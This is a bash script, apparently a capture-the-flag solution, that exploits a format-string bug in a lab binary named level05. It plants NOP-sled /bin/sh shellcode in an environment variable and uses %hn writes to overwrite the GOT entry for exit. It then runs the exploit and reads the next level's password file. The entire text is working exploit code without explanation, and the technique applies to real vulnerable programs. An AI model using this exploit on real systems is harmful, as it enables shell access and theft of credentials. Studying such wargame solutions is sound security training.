#!/bin/bash

function extractHighOrderBytes {
    read address
    echo "$(( $address >> 16 ))"
}

function extractLowOrderBytes {
    read address
    echo "$(( $address & 0x0000ffff ))"
}

function toLittleEndian {
    read address
    python -c "import struct; print struct.pack('<L', int('$address', 16))"
}

function buildExploit {
    NOPSLED="'\x90' * 0xff"
    SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    export SHELLCODE=`python -c "print $NOPSLED + '$SHELLCODE'"`

    SHELLCODE_ADDR=`/tmp/getenv32 SHELLCODE ~/level05`
    SHELLCODE_ADDR_HIGH=`echo $SHELLCODE_ADDR | extractHighOrderBytes`
    SHELLCODE_ADDR_LOW=`echo $SHELLCODE_ADDR | extractLowOrderBytes`

    EXIT_ADDR=`objdump -R ~/level05 | grep exit | cut -d' ' -f1`

    EXIT_ADDR_LOW=`echo $EXIT_ADDR | toLittleEndian`                          # exit address     with format \x00\x00\x00\x00
    EXIT_ADDR_HIGH=`printf "%#.8x" $(( 16#$EXIT_ADDR + 2 )) | toLittleEndian` # exit address + 2 with format \x00\x00\x00\x00

    PADDING_LOW=`printf "%%%dx" $(( $SHELLCODE_ADDR_LOW - 8 ))`
    SPECIFIER_LOW='%10$hn'

    PADDING_HIGH=`printf "%%%dx" $(( $SHELLCODE_ADDR_HIGH - $SHELLCODE_ADDR_LOW ))`                                                        # o address: 0x080484a4 & 0x0000fffff = 0x84a4 - 0x0804 = 0x7ca0 (31904)
    SPECIFIER_HIGH='%11$hn'

    python -c "print '$EXIT_ADDR_LOW' + '$EXIT_ADDR_HIGH' + '$PADDING_LOW' + '$SPECIFIER_LOW' + '$PADDING_HIGH' + '$SPECIFIER_HIGH'" > /tmp/exploit05
}

(buildExploit; set -x; cat /tmp/exploit05 - | ~/level05) > /tmp/out05 << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$(cat /home/users/level06/.pass)"
EOI

xxd -c16 /tmp/exploit05
echo
cat /tmp/out05 | tr -s ' '